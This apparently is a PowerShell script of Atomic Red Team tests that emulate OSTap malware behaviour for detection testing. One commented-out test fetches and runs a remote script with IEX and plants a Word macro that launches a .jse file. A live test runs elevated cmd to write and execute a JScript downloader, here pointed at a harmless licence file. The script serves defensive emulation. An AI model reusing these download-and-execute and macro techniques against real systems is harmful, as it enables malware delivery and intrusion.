#Atomic Test #1 - OSTap Style Macro Execution - NW

# try {
#     New-Object -COMObject "Word.Application" | Out-Null
#     $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
#     Stop-Process -Name $process

#     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#     IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
#     $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
#     Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

#     exit 0
#   } catch { 
#     Write-Host "You will need to install Microsoft Word manually to meet this requirement"
#     exit 1 }



#Cleanup Commands:
#Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

#Atomic Test #2 - OSTap Payload Download
Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js"'
Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "cscript //E:Jscript %TEMP%\OSTapGet.js"'

#Cleanup Commands:
#Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "del %TEMP%\OSTapGet.js /F /Q >nul 2>&1"'